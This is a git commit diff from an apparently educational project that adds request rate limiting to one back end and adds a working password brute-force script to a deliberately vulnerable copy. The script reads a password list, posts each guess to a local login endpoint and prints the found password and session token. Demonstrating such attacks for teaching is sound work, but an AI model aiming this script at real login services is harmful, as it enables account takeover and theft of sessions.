f963b878f2f5e83f1b9f0e29a7b3326d55dd9e89
Fabio <febpalazzi@gmail.com>
2022-03-14 19:17:34 +0100

    :telescope: Update Doc

--- back-end/app/index.js
+++ back-end/app/index.js
@@ -3,16 +3,22 @@ const mysql = require('mysql2');
 const router = require('./routes/routes');
 const bodyParser = require('body-parser');
 const cors = require('cors')
+const rateLimit = require('express-rate-limit')
 require('dotenv').config()
+
+const limiter = rateLimit({
+	windowMs: 15 * 60 * 1000, // 15 minutes
+	max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
+	standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
+	legacyHeaders: false, // Disable the `X-RateLimit-*` headers
+})
 
 var app = express()
 app.use(cors())
-
+app.use(limiter)
 app.use(express.json())
 app.use(express.urlencoded())
-
 app.use(router)
-
 app.listen(process.env.BACKEND_PORT_IN)
 
 console.log("listening on port " + process.env.BACKEND_PORT_IN)
---
+++ vulnerable-back-end/app/test/brute_force.js
@@ -0,0 +1,23 @@
+//script to try many different password to hack an account
+//1 -> INSERT RIGHT MAIL VALUE
+//2 -> RUN: node brute_force.js
+//If esit of attack is fine, script return password and valid token generated
+
+var axios = require('axios');
+const { response } = require('express');
+const lineReader = require('line-reader');
+
+var myJSONObject;
+var email = 'c@c.it' //insert here mail to hack
+
+console.log("Trying...")
+lineReader.eachLine('./pwd_list.txt',(line)=>{
+    myJSONObject = {'mail': email, "pwd": line}
+    axios.post('http://127.0.0.1:3000/api/user/auth', myJSONObject)
+    .then(response => {
+        console.log("Password Found: " + line)
+        console.log("I've got this valid session token [ " + response.data.token + " ]")
+        process.exit()
+    })
+    .catch((error)=>{console.log(error.message)})
+})
